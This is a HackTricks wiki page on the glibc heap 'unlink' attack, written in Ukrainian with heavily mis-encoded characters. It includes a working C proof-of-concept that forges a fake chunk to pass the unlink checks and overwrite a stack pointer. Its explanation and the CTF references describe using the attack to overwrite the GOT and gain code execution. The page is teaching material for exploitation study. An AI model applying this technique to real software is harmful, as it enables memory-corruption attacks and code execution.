# Unlink Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–ö–æ–ª–∏ —Ü—è –∞—Ç–∞–∫–∞ –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞, –≤–æ–Ω–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –¥–æ–∑–≤–æ–ª—è–ª–∞ WWW (Write What Where), –æ–¥–Ω–∞–∫, –¥–µ—è–∫—ñ **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –±—É–ª–∏ –¥–æ–¥–∞–Ω—ñ**, —â–æ –∑—Ä–æ–±–∏–ª–æ –Ω–æ–≤—É –≤–µ—Ä—Å—ñ—é –∞—Ç–∞–∫–∏ –±—ñ–ª—å—à —Ü—ñ–∫–∞–≤–æ—é, –±—ñ–ª—å—à —Å–∫–ª–∞–¥–Ω–æ—é —Ç–∞ **–Ω–µ–¥—ñ–π—Å–Ω–æ—é**.

### –ü—Ä–∏–∫–ª–∞–¥ –∫–æ–¥—É:

<details>

<summary>Code</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* –ê—Ç–∞–∫–∞ –Ω–µ –ø—Ä–∞—Ü—é—î, —è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è tcaches (–ø—ñ—Å–ª—è 2.26)

### –ú–µ—Ç–∞

–¶—è –∞—Ç–∞–∫–∞ –¥–æ–∑–≤–æ–ª—è—î **–∑–º—ñ–Ω–∏—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ —à–º–∞—Ç–æ–∫, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ 3 –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥ —Å–æ–±–æ—é**. –Ø–∫—â–æ —Ü–µ –Ω–æ–≤–µ –º—ñ—Å—Ü–µ (–æ–∫–æ–ª–∏—Ü—ñ, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏–≤—Å—è –≤–∫–∞–∑—ñ–≤–Ω–∏–∫) –º—ñ—Å—Ç–∏—Ç—å —Ü—ñ–∫–∞–≤—ñ –¥–∞–Ω—ñ, —Ç–∞–∫—ñ —è–∫ —ñ–Ω—à—ñ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω—ñ –∞–ª–æ–∫–∞—Ü—ñ—ó / —Å—Ç–µ–∫..., –º–æ–∂–Ω–∞ —ó—Ö –ø—Ä–æ—á–∏—Ç–∞—Ç–∏/–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏, —â–æ–± –∑–∞–≤–¥–∞—Ç–∏ –±—ñ–ª—å—à–æ—ó —à–∫–æ–¥–∏.

* –Ø–∫—â–æ —Ü–µ–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –∑–Ω–∞—Ö–æ–¥–∏–≤—Å—è –≤ —Å—Ç–µ–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–µ–ø–µ—Ä –≤—ñ–Ω –≤–∫–∞–∑—É—î –Ω–∞ 3 –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥ —Å–æ–±–æ—é, —ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –π–æ–≥–æ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ç–∞ –∑–º—ñ–Ω–∏—Ç–∏, –±—É–¥–µ –º–æ–∂–ª–∏–≤–∏–º –≤–∏—Ç—ñ–∫ —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑—ñ —Å—Ç–µ–∫—É –∞–±–æ –Ω–∞–≤—ñ—Ç—å –∑–º—ñ–Ω–∏—Ç–∏ –∞–¥—Ä–µ—Å—É –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è (–º–æ–∂–ª–∏–≤–æ), –Ω–µ —Ç–æ—Ä–∫–∞—é—á–∏—Å—å –∫–∞–Ω–∞—Ä–∫–∏.
* –£ –ø—Ä–∏–∫–ª–∞–¥–∞—Ö CTF —Ü–µ–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –º–∞—Å–∏–≤—ñ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫—ñ–≤ –Ω–∞ —ñ–Ω—à—ñ –∞–ª–æ–∫–∞—Ü—ñ—ó, —Ç–æ–º—É, –∑—Ä–æ–±–∏–≤—à–∏ –π–æ–≥–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º –Ω–∞ 3 –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥ —Å–æ–±–æ—é —ñ –º–∞—é—á–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —á–∏—Ç–∞—Ç–∏ —Ç–∞ –ø–∏—Å–∞—Ç–∏, –º–æ–∂–Ω–∞ –∑–º—É—Å–∏—Ç–∏ —ñ–Ω—à—ñ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ —ñ–Ω—à—ñ –∞–¥—Ä–µ—Å–∏.\
–û—Å–∫—ñ–ª—å–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ç–∞–∫–æ–∂ –º–æ–∂–µ —á–∏—Ç–∞—Ç–∏/–ø–∏—Å–∞—Ç–∏ —ñ–Ω—à—ñ –∞–ª–æ–∫–∞—Ü—ñ—ó, –≤—ñ–Ω –º–æ–∂–µ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∞–±–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –Ω–æ–≤—ñ –∞–¥—Ä–µ—Å–∏ –≤ –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –º—ñ—Å—Ü—è—Ö (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —É GOT).

### –í–∏–º–æ–≥–∏

* –î–µ—è–∫–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å —É –ø–∞–º'—è—Ç—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å—Ç–µ–∫), —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ —à–º–∞—Ç–∫—ñ–≤, –Ω–∞–¥–∞—é—á–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –¥–µ—è–∫–∏–º –∞—Ç—Ä–∏–±—É—Ç–∞–º.
* –í–∏—Ç—ñ–∫ —Å—Ç–µ–∫—É –¥–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –≤–∫–∞–∑—ñ–≤–Ω–∏–∫—ñ–≤ —Ñ–µ–π–∫–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞.

### –ê—Ç–∞–∫–∞

* –Ñ –∫—ñ–ª—å–∫–∞ —à–º–∞—Ç–∫—ñ–≤ (chunk1 —ñ chunk2)
* –ê—Ç–∞–∫—É—é—á–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—é—î –≤–º—ñ—Å—Ç chunk1 —ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ chunk2.
* –£ chunk1 –∞—Ç–∞–∫—É—é—á–∏–π —Å—Ç–≤–æ—Ä—é—î —Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ñ–µ–π–∫–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞:
* –©–æ–± –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç, –≤—ñ–Ω –ø–µ—Ä–µ–∫–æ–Ω—É—î—Ç—å—Å—è, —â–æ –ø–æ–ª–µ `size` –ø—Ä–∞–≤–∏–ª—å–Ω–µ, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ø–æ–º–∏–ª–∫–∏: `corrupted size vs. prev_size while consolidating`
* —ñ –ø–æ–ª—è `fd` —Ç–∞ `bk` —Ñ–µ–π–∫–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ chunk1 –∑ –æ—Ñ—Å–µ—Ç–∞–º–∏ -3 —ñ -2 –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ, —Ç–∞–∫ —â–æ `fake_chunk->fd->bk` —ñ `fake_chunk->bk->fd` –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –ø–æ–∑–∏—Ü—ñ—é –≤ –ø–∞–º'—è—Ç—ñ (—Å—Ç–µ–∫), –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è —Ä–µ–∞–ª—å–Ω–∞ –∞–¥—Ä–µ—Å–∞ chunk1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* –ó–∞–≥–æ–ª–æ–≤–∫–∏ chunk2 –º–æ–¥–∏—Ñ—ñ–∫—É—é—Ç—å—Å—è, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏, —â–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —ñ —â–æ —Ä–æ–∑–º—ñ—Ä —î —Ä–æ–∑–º—ñ—Ä–æ–º —Ñ–µ–π–∫–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞.
* –ö–æ–ª–∏ –¥—Ä—É–≥–∏–π —à–º–∞—Ç–æ–∫ –∑–≤—ñ–ª—å–Ω—è—î—Ç—å—Å—è, —Ü–µ–π —Ñ–µ–π–∫–æ–≤–∏–π —à–º–∞—Ç–æ–∫ –≤—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è, –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* –†–∞–Ω—ñ—à–µ –±—É–ª–æ –∑—Ä–æ–±–ª–µ–Ω–æ —Ç–∞–∫, —â–æ `fake_chunk->fd->bk` —ñ `fake_chunk->bk->fd` –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ —Å–∞–º–µ –º—ñ—Å—Ü–µ (–º—ñ—Å—Ü–µ –≤ —Å—Ç–µ–∫—É, –¥–µ –∑–±–µ—Ä—ñ–≥–∞–≤—Å—è `chunk1`, —Ç–æ–º—É —Ü–µ –±—É–≤ –¥—ñ–π—Å–Ω–∏–π –∑–≤'—è–∑–∞–Ω–∏–π —Å–ø–∏—Å–æ–∫). –û—Å–∫—ñ–ª—å–∫–∏ **–æ–±–∏–¥–≤–∞ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ —Å–∞–º–µ –º—ñ—Å—Ü–µ**, –ª–∏—à–µ –æ—Å—Ç–∞–Ω–Ω—ñ–π (`fake_chunk->bk->fd = fake_chunk->fd`) –º–∞—Ç–∏–º–µ **–µ—Ñ–µ–∫—Ç**.
* –¶–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—à–µ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ chunk1 —É —Å—Ç–µ–∫—É –Ω–∞ –∞–¥—Ä–µ—Å—É (–∞–±–æ –±–∞–π—Ç–∏), –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –Ω–∞ 3 –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥ —É —Å—Ç–µ–∫—É**.
* –û—Ç–∂–µ, —è–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π –∑–Ω–æ–≤—É –∑–º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç chunk1, –≤—ñ–Ω –∑–º–æ–∂–µ **–ø–∏—Å–∞—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É**, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—é—á–∏ –∞–¥—Ä–µ—Å—É –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è, –ø—Ä–æ–ø—É—Å–∫–∞—é—á–∏ –∫–∞–Ω–∞—Ä–∫—É, —ñ –∑–º—ñ–Ω—é—é—á–∏ –∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö. –ù–∞–≤—ñ—Ç—å –∑–Ω–æ–≤—É –∑–º—ñ–Ω—é—é—á–∏ –∞–¥—Ä–µ—Å—É chunk1, –∑–±–µ—Ä–µ–∂–µ–Ω—É –≤ —Å—Ç–µ–∫—É, –Ω–∞ —ñ–Ω—à–µ –º—ñ—Å—Ü–µ, –¥–µ, —è–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π –∑–Ω–æ–≤—É –∑–º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç chunk1, –≤—ñ–Ω –∑–º–æ–∂–µ –ø–∏—Å–∞—Ç–∏ –∫—É–¥–∏ –∑–∞–≤–≥–æ–¥–Ω–æ.
* –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ –±—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º, –æ—Å–∫—ñ–ª—å–∫–∏ **–∞–¥—Ä–µ—Å–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ —Å—Ç–µ–∫—É**. –†–∏–∑–∏–∫ —ñ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –º–æ–∂—É—Ç—å –∑–∞–ª–µ–∂–∞—Ç–∏ –≤—ñ–¥ **—Ç–æ–≥–æ, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –∞–¥—Ä–µ—Å–∏ —Ñ–µ–π–∫–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* –•–æ—á–∞ –±—É–ª–æ –± –¥–∏–≤–Ω–æ –∑–Ω–∞–π—Ç–∏ –∞—Ç–∞–∫—É unlink –Ω–∞–≤—ñ—Ç—å —É CTF, —Ç—É—Ç –≤–∏ –º–∞—î—Ç–µ –∫—ñ–ª—å–∫–∞ –∑–≤—ñ—Ç—ñ–≤, –¥–µ —Ü—è –∞—Ç–∞–∫–∞ –±—É–ª–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞:
* –ü—Ä–∏–∫–ª–∞–¥ CTF: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* –£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ, –∑–∞–º—ñ—Å—Ç—å —Å—Ç–µ–∫—É —î –º–∞—Å–∏–≤ –∞–¥—Ä–µ—Å, –≤–∏–¥—ñ–ª–µ–Ω–∏—Ö malloc. –ê—Ç–∞–∫–∞ unlink –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–¥—ñ–ª–∏—Ç–∏ —à–º–∞—Ç–æ–∫ —Ç—É—Ç, –æ—Ç–∂–µ, –∫–æ–Ω—Ç—Ä–æ–ª—é—é—á–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ –º–∞—Å–∏–≤—É –∞–¥—Ä–µ—Å, –≤–∏–¥—ñ–ª–µ–Ω–∏—Ö malloc. –ü–æ—Ç—ñ–º —î —â–µ –æ–¥–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç —à–º–∞—Ç–∫—ñ–≤ —É —Ü–∏—Ö –∞–¥—Ä–µ—Å–∞—Ö, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∫–∞–∑—É–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏ –Ω–∞ GOT, –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–∏—Ç–æ–∫—ñ–≤ —ñ RCE.
* –©–µ –æ–¥–∏–Ω –ø—Ä–∏–∫–ª–∞–¥ CTF: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* –Ø–∫ —ñ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ, —î –º–∞—Å–∏–≤ –∞–¥—Ä–µ—Å –∞–ª–æ–∫–∞—Ü—ñ–π. –ú–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É unlink, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ –∞–¥—Ä–µ—Å—É –¥–æ –ø–µ—Ä—à–æ—ó –∞–ª–æ–∫–∞—Ü—ñ—ó –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –∫—ñ–ª—å–∫–∞ –ø–æ–∑–∏—Ü—ñ–π –ø–µ—Ä–µ–¥ –ø–æ—á–∞—Ç–∫–æ–º –º–∞—Å–∏–≤—É —ñ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —Ü—é –∞–ª–æ–∫–∞—Ü—ñ—é –≤ –Ω–æ–≤—ñ–π –ø–æ–∑–∏—Ü—ñ—ó. –û—Ç–∂–µ, –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ —ñ–Ω—à–∏—Ö –∞–ª–æ–∫–∞—Ü—ñ–π, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ GOT —Ñ—É–Ω–∫—Ü—ñ—ó atoi, –≤–∏–≤–µ—Å—Ç–∏ —ó—ó, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∏—Ç—ñ–∫ libc, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ GOT atoi –∞–¥—Ä–µ—Å–æ—é –¥–æ –æ–¥–Ω–æ–≥–æ –≥–∞–¥–∂–µ—Ç–∞.
* –ü—Ä–∏–∫–ª–∞–¥ CTF –∑ –∫–∞—Å—Ç–æ–º–Ω–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏ malloc —ñ free, —è–∫—ñ –∑–ª–æ–≤–∂–∏–≤–∞—é—Ç—å –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é, –¥—É–∂–µ —Å—Ö–æ–∂–æ—é –Ω–∞ –∞—Ç–∞–∫—É unlink: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* –Ñ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ FD —ñ BK –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ malloc, —è–∫—ñ –±—É–¥—É—Ç—å (–∫–∞—Å—Ç–æ–º–Ω–æ) –∑–≤—ñ–ª—å–Ω–µ–Ω—ñ. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –∫—É–ø–∞ –º–∞—î –±—ñ—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, —Ç–æ–º—É –º–æ–∂–Ω–∞ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –∫—É–ø–∏ —ñ –≤–∫–∞–∑—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é –∑ GOT –Ω–∞ —à–º–∞—Ç–æ–∫ –∫—É–ø–∏ –∑ shellcode –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
